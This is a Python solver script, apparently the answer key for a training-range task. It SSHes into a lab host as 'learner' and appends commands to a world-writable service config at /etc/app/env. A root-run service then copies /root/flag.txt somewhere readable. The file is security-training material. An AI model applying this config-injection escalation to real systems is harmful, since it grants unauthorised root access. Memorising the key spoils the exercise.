"""Intended-path solver: append payload lines to the world-writable service config."""

import time
import urllib.parse

import paramiko

from openrange.content.solver import SolveResult, TaskResult, find_flags

ENUMERATE = "ps aux || true"
APPEND_PAYLOAD = (
    "printf '%s\\n' 'cp /root/flag.txt /tmp/flag' 'chmod 644 /tmp/flag' >> /etc/app/env"
)
READ_FLAG = "cat /tmp/flag 2>/dev/null"
POLL_SECONDS = 60
POLL_INTERVAL = 4


def _target(ctx) -> tuple[str, int]:  # type: ignore[no-untyped-def]
    parsed = urllib.parse.urlsplit(ctx.url("target"))
    return parsed.hostname or "target", parsed.port or 22


def solve(ctx) -> SolveResult:  # type: ignore[no-untyped-def]
    host, port = _target(ctx)
    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(
        host,
        port=port,
        username="learner",
        password="learner",
        look_for_keys=False,
        allow_agent=False,
        timeout=15,
    )
    try:
        _, stdout, _ = client.exec_command(ENUMERATE, timeout=15)
        enum_out = stdout.read().decode(errors="replace")
        if "app-runner.sh" not in enum_out:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="config-source-hijack",
                        ok=False,
                        captured=None,
                        detail=f"app-runner.sh not visible in ps output: {enum_out[:200]}",
                    )
                ]
            )

        _, stdout, stderr = client.exec_command(APPEND_PAYLOAD, timeout=15)
        code = stdout.channel.recv_exit_status()
        err = stderr.read().decode(errors="replace")
        if code != 0:
            return SolveResult(
                results=[
                    TaskResult(
                        task_id="config-source-hijack",
                        ok=False,
                        captured=None,
                        detail=f"could not append to /etc/app/env (rc={code}): {err[:200]}",
                    )
                ]
            )

        deadline = time.monotonic() + POLL_SECONDS
        captured = None
        out = ""
        while time.monotonic() < deadline:
            _, stdout, _ = client.exec_command(READ_FLAG, timeout=10)
            out = stdout.read().decode(errors="replace")
            flags = find_flags(out)
            if flags:
                captured = flags[0]
                break
            time.sleep(POLL_INTERVAL)
    finally:
        client.close()

    return SolveResult(
        results=[
            TaskResult(
                task_id="config-source-hijack",
                ok=bool(captured),
                captured=captured,
                detail=None
                if captured
                else f"service did not deliver /tmp/flag in {POLL_SECONDS}s: {out[:200]}",
            )
        ]
    )
